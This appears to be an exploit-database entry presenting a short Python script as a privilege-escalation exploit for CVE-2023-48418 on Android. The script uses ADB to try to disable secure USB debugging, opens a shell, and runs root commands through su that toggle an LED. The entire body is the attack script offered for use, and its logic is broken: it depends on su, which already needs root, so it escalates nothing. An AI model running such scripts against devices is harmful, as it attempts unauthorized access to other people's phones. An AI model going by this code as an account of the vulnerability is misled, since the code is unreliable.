id: 39237
date: 01/11/2024
title: Android DeviceVersionFragment.java Privilege Escalation Exploit
author: Amirhossein Bahramizadeh
cves: CVE-2023-48418

#!/usr/bin/env python

import subprocess

# Connect to the device via ADB
subprocess.run(["adb", "devices"])

# Check if the device is in secure USB mode
device = subprocess.run(["adb", "shell", "getprop", "ro.adb.secure"], stdout=subprocess.PIPE)
if "1" in device.stdout.decode():
    # Secure USB mode is enabled, so we need to disable it
    subprocess.run(["adb", "shell", "setprop", "ro.adb.secure", "0"])

# Exploit the vulnerability by accessing ADB before SUW completion
subprocess.run(["adb", "shell"])

# Escalate privileges by executing commands as the root user
subprocess.run(["adb", "shell", "su", "-c", "echo 0 > /sys/class/leds/led:green: charging/brightness"], check=True)
subprocess.run(["adb", "shell", "su", "-c", "echo 100 > /sys/class/leds/led:green: charging/brightness"], check=True)

#  0day.today [2024-01-15]  #